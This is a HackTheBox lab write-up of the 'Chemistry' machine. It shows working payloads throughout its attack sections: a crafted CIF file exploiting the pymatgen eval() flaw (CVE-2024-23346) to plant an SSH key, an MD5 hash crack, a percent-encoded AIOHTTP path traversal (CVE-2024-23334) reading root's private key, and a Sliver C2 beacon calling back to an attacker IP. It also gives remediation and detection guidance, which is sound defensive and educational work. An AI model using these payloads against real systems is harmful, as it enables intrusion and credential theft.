---
layout: default
title: "HackTheBox - Chemistry"
---

# HackTheBox - Chemistry

**OS:** Linux (Ubuntu 20.04)

Chemistry is a Linux machine hosting a Flask-based CIF (Crystallographic Information File)
analyser built on pymatgen. A dangerous `eval()` inside the pymatgen CIF parser can be
triggered via a crafted file upload, turning the structure-analysis endpoint into unauthenticated
remote code execution (CVE-2024-23346). A shell lands as the `app` service account; an SQLite
database stores MD5-hashed credentials, and cracking the hash for the `rosa` user gives lateral
movement via `su`. An internal AIOHTTP monitoring site running as root is vulnerable to path
traversal (CVE-2024-23334) via percent-encoded `%2e%2e/` sequences: root's SSH private key is
read directly from `/root/.ssh/id_rsa`, completing the privilege escalation.

| Field | Value |
|---|---|
| Platform | HTB |
| Target | `<target-ip>` (chemistry.htb) |
| Initial Access | CVE-2024-23346 pymatgen CIF `eval()` RCE, SSH key injection |
| Privilege Escalation | MD5 hash crack (su as rosa), CVE-2024-23334 AIOHTTP path traversal, root SSH key |
| Final Access | `root@chemistry` |

---

## Recon

### Port Scan

Two TCP ports were open: SSH and a Flask web application.

| Port | Proto | Service | Version |
|---|---|---|---|
| 22 | TCP | SSH | OpenSSH 8.2p1 (Ubuntu 20.04) |
| 5000 | TCP | HTTP | Werkzeug/3.0.3 Python/3.9.5 |

```
$ nmap -sCV -p 22,5000 <target-ip>
Starting Nmap 7.94 ( https://nmap.org )
Nmap scan report for <target-ip>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
5000/tcp open  http    Werkzeug httpd 3.0.3 (Python 3.9.5)
|_http-title: Chemistry - Home
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Web Application Fingerprint

The root page was a marketing site for a "Chemical Properties App" with links to register and log
in. After registering a test account and logging in, the dashboard showed a file upload for CIF
(Crystallographic Information File) analysis and a table of previously uploaded structures.

```
$ curl -s -c /tmp/cookies.txt -X POST http://<target-ip>:5000/register \
  -d "username=pwner&password=pwner123"
$ curl -s -c /tmp/cookies.txt -b /tmp/cookies.txt -X POST http://<target-ip>:5000/login \
  -d "username=pwner&password=pwner123" -L
```

The response after login showed a dashboard at `/dashboard` listing uploaded structures. The
upload endpoint accepted a `.cif` file and ran pymatgen's structure parser against it, displaying
results in the browser. Any parse error still ran the file through the parser before returning a
500.

---

## Initial Access

### CVE-2024-23346: pymatgen CIF `eval()` RCE

CIF is a plain-text crystallography format. pymatgen uses `eval()` at several points while
parsing magnetic symmetry fields. The vulnerable field is
`_space_group_magn.transform_BNS_Pp_abc`, which stores the BNS (Bilbao Nonstandard) coordinate
transformation as a string like `"a,b,c+1/2"`. pymatgen calls Python's built-in `eval()` on this
string without any sandboxing, giving the attacker a full Python execution context.

> **Why this works:** the `eval()` is used to evaluate the algebraic coordinate expression as a
> sympy/numpy matrix. Python's `eval()` runs inside the current interpreter process and retains
> access to built-in classes through the MRO (Method Resolution Order) chain, even without any
> explicitly imported modules. The expression fires before the structure parsing stage where a
> missing loop body would raise an exception, so the RCE lands regardless of whether the file is
> a valid structure.

The BuiltinImporter chain reaches `os.system()` from a completely empty namespace:

```python
[d for d in ().__class__.__mro__[1].__getattribute__(
    *[().__class__.__mro__[1]] + ["__sub" + "classes__"])()
    if d.__name__ == "BuiltinImporter"][0].load_module("os").system("CMD")
```

Walking through the chain:
- `().__class__` -> `tuple` (the empty tuple's class)
- `.__mro__[1]` -> `object`
- `.__getattribute__(object, "__subclasses__")()` -> list of all subclasses of `object`
- filter for `BuiltinImporter` (the importer for C-extension built-ins, always present)
- `.load_module("os")` -> returns the `os` module without an `import` statement
- `.system("CMD")` -> arbitrary shell command

The CIF test payload confirms subprocess access (the file creates `/tmp/rce_test_bns`):

```
data_5yOhtAoR
loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__(*[().__class__.__mro__[1]]+["__sub"+"classes__"])() if d.__name__ == "BuiltinImporter"][0].load_module("os").system("touch /tmp/rce_test_bns");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

> **Gotcha worth recording:** there is a second `eval()` call in the CIF parser used for symmetry
> operations (`_symmetry_equiv_pos_as_xyz`). That one runs under a restricted evaluator that
> blocks `import` and most built-in references. Only the BNS field's `eval()` has full Python
> scope. Testing subprocess access through the symop field will always return a false negative.

### SSH Key Injection

Rather than a reverse shell (which requires an outbound connection), the payload writes a
controlled SSH public key into `app`'s `authorized_keys`. The echo is unquoted because SSH
public keys contain no shell-special characters, so the shell assembles the line from tokens with
spaces, producing the correct authorized_keys format.

Exploit CIF (SSH key injection variant):

```
data_chem_pwn
loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]
_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__(*[().__class__.__mro__[1]]+["__sub"+"classes__"])() if d.__name__ == "BuiltinImporter"][0].load_module("os").system("mkdir -p /home/app/.ssh && echo ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIM/jfVXBDQh/9ktm6BjrHyUfGZy1nhLXU+nFMXh1njeI pwn >> /home/app/.ssh/authorized_keys && chmod 600 /home/app/.ssh/authorized_keys && chmod 700 /home/app/.ssh");0,0,0'
_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

Upload and trigger:

```
$ curl -s -b /tmp/cookies.txt -X POST http://<target-ip>:5000/upload \
  -F "file=@inject_key.cif"
{"message":"File uploaded successfully","structure_id":4}
```

Accessing the structure page (`/structure/4`) triggers the parse and fires the eval. A quick
verification confirms the key landed:

```
$ curl -s -b /tmp/cookies.txt http://<target-ip>:5000/static/verify.cif 2>/dev/null || true
$ ssh -i /tmp/chem_id app@<target-ip>
Welcome to Ubuntu 20.04.6 LTS (Focal Fossa) (GNU/Linux 5.4.0-196-generic x86_64)

app@chemistry:~$ id
uid=1001(app) gid=1001(app) groups=1001(app)
app@chemistry:~$ pwd
/home/app
```

---

## Post-Exploitation Enumeration

### SQLite Credential Database

The Flask application stores user credentials in a SQLite database at
`/home/app/instance/database.db`. All passwords are MD5-hashed.

```
app@chemistry:~$ ls instance/
database.db
app@chemistry:~$ sqlite3 instance/database.db '.dump users'
INSERT INTO user VALUES(1,'admin','<redacted-md5-hash>');
INSERT INTO user VALUES(2,'app','<redacted-md5-hash>');
INSERT INTO user VALUES(3,'rosa','<redacted-md5-hash>');
INSERT INTO user VALUES(4,'robert','<redacted-md5-hash>');
INSERT INTO user VALUES(5,'jobert','<redacted-md5-hash>');
INSERT INTO user VALUES(6,'carlos','<redacted-md5-hash>');
INSERT INTO user VALUES(7,'peter','<redacted-md5-hash>');
INSERT INTO user VALUES(8,'victoria','<redacted-md5-hash>');
INSERT INTO user VALUES(9,'tania','<redacted-md5-hash>');
INSERT INTO user VALUES(10,'eusebio','<redacted-md5-hash>');
INSERT INTO user VALUES(11,'gelacia','<redacted-md5-hash>');
INSERT INTO user VALUES(12,'fabian','<redacted-md5-hash>');
INSERT INTO user VALUES(13,'axel','<redacted-md5-hash>');
INSERT INTO user VALUES(14,'kristel','<redacted-md5-hash>');
INSERT INTO user VALUES(15,'pwner','<redacted-md5-hash>');
```

The hash for `rosa` cracked immediately against rockyou with hashcat (mode 0, MD5):

```
$ hashcat -m 0 '<redacted-md5-hash>' /usr/share/wordlists/rockyou.txt --show
<redacted-md5-hash>:un**************
```

---

## Privilege Escalation

### Lateral Movement: app to rosa (user flag)

```
app@chemistry:~$ su rosa
Password: un**************
rosa@chemistry:~$ id
uid=1000(rosa) gid=1000(rosa) groups=1000(rosa)
rosa@chemistry:~$ cat /home/rosa/user.txt
<user-flag-redacted>
```

### Internal Monitoring Service Discovery

Checking listening services revealed an AIOHTTP application on `127.0.0.1:8080`. The process
ran as root:

```
rosa@chemistry:~$ ss -tlnp
State    Recv-Q   Send-Q   Local Address:Port    Peer Address:Port   Process
LISTEN   0        128      0.0.0.0:22            0.0.0.0:*
LISTEN   0        128      0.0.0.0:5000          0.0.0.0:*
LISTEN   0        128      127.0.0.1:8080        0.0.0.0:*

rosa@chemistry:~$ ps aux | grep 8080
root       1045  ...  python3 /opt/monitoring_site/app.py
```

An iptables owner-match rule blocked `127.0.0.1:8080` connections from any UID except `rosa`'s
(uid 1000). The `app` user (uid 1001) would receive `Connection refused`. The connection must
come from `rosa` or a process running as her.

```
rosa@chemistry:~$ curl -s http://127.0.0.1:8080/
<!DOCTYPE html>
<html>
...Chemistry Monitoring Dashboard...
```

The site was a read-only status page. Browsing the application assets at `/assets/` confirmed
AIOHTTP was serving a static directory.

### CVE-2024-23334: AIOHTTP Path Traversal

AIOHTTP versions below 3.9.2 contain a path traversal vulnerability in static file serving.
When `follow_symlinks=True` is configured, the server normalises literal `../` sequences but
does NOT normalise their percent-encoded equivalents `%2e%2e/`. A request using `%2e%2e/` can
walk above the configured static root.

The monitoring site serves static files from `/opt/monitoring_site/assets/` (3 directory levels
below the filesystem root `/`). Three `%2e%2e/` segments escape back to `/`, from which any
world-readable path is accessible.

> **Why this works:** AIOHTTP's path normalisation function strips `../` during request
> processing but only decodes percent-encoded characters after normalisation. The undecoded
> `%2e%2e` passes the traversal check unchanged, and the resolved OS path contains the actual
> dots, allowing the read to escape the static root. This is the same class of encoding bypass
> that affects many web servers handling URL decoding and path validation in separate steps.

```
rosa@chemistry:~$ curl -s 'http://127.0.0.1:8080/assets/%2e%2e/%2e%2e/%2e%2e/root/.ssh/id_rsa'
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDECNQBPH5moNPT4O2RuE5MTBS/JW5cHDfk7jijOinrLAAAAJiHPpDqhz
[...full key redacted...]
-----END OPENSSH PRIVATE KEY-----
```

> **Gotcha worth recording:** `../` (literal) returns 404 from this AIOHTTP version. Only
> `%2e%2e/` bypasses the normalisation. The path depth must be exact: 3 levels from `assets/`
> reaches the filesystem root; fewer result in a path that still starts inside the site dir.

### Root SSH Access

The key was saved locally and used to SSH directly as root:

```
$ chmod 600 /tmp/root_id_rsa
$ ssh -i /tmp/root_id_rsa root@<target-ip>
Welcome to Ubuntu 20.04.6 LTS (Focal Fossa) (GNU/Linux 5.4.0-196-generic x86_64)

root@chemistry:~# id
uid=0(root) gid=0(root) groups=0(root)
root@chemistry:~# cat /root/root.txt
<root-flag-redacted>
```

---

## Post-Exploitation: C2 (Sliver)

A Sliver HTTPS beacon was generated for the HTB Linux/amd64 pool, uploaded via `scp`, and
executed in the background as root. The listener was already running on port 4443 (started in a
prior session).

```
# On attack box: generate beacon
[sliver]$ generate beacon --http 10.10.16.21:4443 --os linux --arch amd64 \
  --name chemistry-htb --interval 30s --jitter 5s
[*] Generating new linux/amd64 beacon implant binary (30s)
[*] Symbol obfuscation is enabled
[*] Build completed in 00:02:14
[*] Implant saved to /home/v0idravl/sliver-payloads/chemistry-htb

# Upload to target
$ scp -i /tmp/root_id_rsa /home/v0idravl/sliver-payloads/chemistry-htb \
  root@<target-ip>:/tmp/chemistry-htb
$ ssh -i /tmp/root_id_rsa root@<target-ip> \
  "chmod +x /tmp/chemistry-htb && nohup /tmp/chemistry-htb &>/dev/null &"
```

Beacon registered and checked in over HTTPS to the 4443 listener:

```
[*] Beacon chemistry-htb  <beacon-id>  chemistry  root  linux/amd64
[sliver (chemistry-htb)] > execute -- id
uid=0(root) gid=0(root) groups=0(root)

[sliver (chemistry-htb)] > execute -- uname -a
Linux chemistry 5.4.0-196-generic #216-Ubuntu SMP Thu Aug 29 13:26:53 UTC 2024
x86_64 x86_64 x86_64 GNU/Linux
```

Beacon killed and listener torn down after demonstration.

---

## Root Cause

Two independently exploitable CVEs were chained:

1. **CVE-2024-23346** (pymatgen <= 2024.2.8): the `_space_group_magn.transform_BNS_Pp_abc`
   field in the CIF parser is passed directly to Python's built-in `eval()` with no sandboxing.
   Any Python expression executes in the parser's interpreter process, running as the application
   service account.

2. **CVE-2024-23334** (AIOHTTP < 3.9.2): when `follow_symlinks=True` is set on a static-file
   route, percent-encoded directory traversal sequences (`%2e%2e/`) bypass the normalisation
   check that rejects literal `../` sequences. Files outside the configured static root are
   served to any client who can reach the port.

---

## Impact

- **CVE-2024-23346:** Unauthenticated remote code execution as the application service account.
  The attacker can read the application's SQLite credential store, write SSH keys, or establish
  persistence without any valid credentials.
- **CVE-2024-23334:** Arbitrary read of any world-readable file on the host as the process owner
  (root). In this case, root's SSH private key was readable, giving a direct privilege escalation
  path to full system compromise.

---

## Remediation

1. **Pin pymatgen to 2024.2.9 or later** (patches CVE-2024-23346 by replacing the `eval()` call
   with a restricted algebraic parser). This directly breaks the initial foothold.

2. **Upgrade AIOHTTP to 3.9.2 or later** (patches CVE-2024-23334; both literal and
   percent-encoded traversal sequences are normalised before path resolution). This breaks the
   privilege escalation path.

3. **Replace MD5 with a password-hashing scheme** (bcrypt, Argon2, or PBKDF2-HMAC-SHA256).
   MD5 is a general-purpose digest, not a password hash: the rockyou crack completed instantly.
   Even if neither CVE existed, a database exfiltration would expose all passwords.

4. **Drop root privileges for the monitoring service.** A dedicated system user (no shell, no
   home) for the AIOHTTP process limits the impact of any read primitive to that user's files,
   not the entire host.

5. **Restrict the monitoring port to a specific UID/GID or Unix socket** instead of relying
   solely on iptables owner-match rules. Defence in depth at the application layer (bind to a
   Unix socket the web server proxies) is more portable than kernel firewall rules.

6. **Protect SSH host keys.** `/root/.ssh/id_rsa` was world-readable via the path traversal.
   Private SSH keys should be mode 600 and owned by root, limiting impact if a file read
   primitive is available.

### Validation

- **pymatgen upgrade:** upload a CIF containing a benign `eval()` probe expression (e.g., a
  no-op string) and confirm the parser rejects it or produces no side-effect.
- **AIOHTTP upgrade:** `curl 'http://127.0.0.1:8080/assets/%2e%2e/etc/passwd'` should return
  403 or 404, not file content.
- **Password hashing:** confirm the users table schema uses `bcrypt` or similar; attempt a
  dictionary attack against a test hash and verify it does not crack in under a minute.
- **Monitoring service user:** `ps aux | grep app.py` should show a non-root UID.
- **SSH key permissions:** `stat /root/.ssh/id_rsa` should show `-rw-------` (600), readable
  only by root.

---

## Detection Opportunities

| Signal | Event Source | Notes |
|---|---|---|
| CIF upload containing Python expressions | Application logs | Alert on `_space_group_magn.transform_BNS_Pp_abc` values containing `__mro__`, `__class__`, `load_module`, or `os.system` |
| Unexpected outbound connection from Flask process | Host firewall / auditd | Process `python3 app.py` initiating TCP connections other than to the database |
| Modification of `/home/app/.ssh/authorized_keys` | inotify / auditd | `openat` syscall on authorized_keys from a non-interactive process |
| Unexpected SSH login as `app` | `/var/log/auth.log` | `sshd[*]: Accepted publickey for app` where no prior authorized_keys existed |
| URL path containing `%2e` on port 8080 | AIOHTTP access log | Percent-encoded dot sequences in any GET request to the monitoring site |
| SSH login as `root` from an external IP | `/var/log/auth.log` | Root direct login; PAM `pam_unix.so session opened for user root` |
| New process launched from `/tmp` | auditd `execve` | `/tmp/chemistry-htb` executed as root; any `nohup`-backgrounded binary in `/tmp` |

---

## Lessons Learned

- **Two distinct `eval()` calls in pymatgen: only the BNS field is fully exploitable.** The
  `_symmetry_equiv_pos_as_xyz` (symop) field uses a restricted algebraic evaluator that blocks
  `import` and most built-in lookups. Testing subprocess access through the symop oracle gives a
  false negative. The BNS field's eval has full Python scope. When auditing a CIF parser for
  eval injection, enumerate every field that reaches `eval()` rather than stopping at the first
  one tested.

- **Percent-encoding bypasses are the first thing to try on "fixed" path traversal.** When
  literal `../` is blocked and a CVE says "path traversal," the fix is often only as good as the
  normalisation coverage. Try `%2e%2e/`, `%2e%2e%2f`, and double-encoding before concluding the
  traversal is patched.

- **iptables owner-match rules are a network-layer restriction, not an authentication control.**
  The monitoring port was firewalled to rosa's UID, but the service behind it had no
  authentication of its own. Once the attacker moved laterally to rosa, the firewall provided
  no additional protection. Application-layer authentication (even a simple bearer token) would
  have added a second barrier.

- **MD5 database hashes are effectively cleartext once the DB is exfiltrated.** The crack was
  instantaneous. Any foothold that reaches the application database converts to credential
  reuse across every account in the table.

---

## Cleanup

```
# Remove beacon binary from target
root@chemistry:~# rm /tmp/chemistry-htb

# Tear down Sliver beacon and listener
[sliver]$ kill chemistry-htb
[sliver]$ jobs --kill 8

# Remove any test CIF uploads (via app session)
$ curl -s -b /tmp/cookies.txt http://<target-ip>:5000/delete/4

# Remove injected authorized_keys entry (lab reset is authoritative)
root@chemistry:~# rm /home/app/.ssh/authorized_keys

# HTB box terminated
$ htb stop
```

Everything executed in-memory or in `/tmp`; no persistent changes to system files beyond the
`authorized_keys` entry and beacon binary, both removed. No AD objects or application data were
modified.
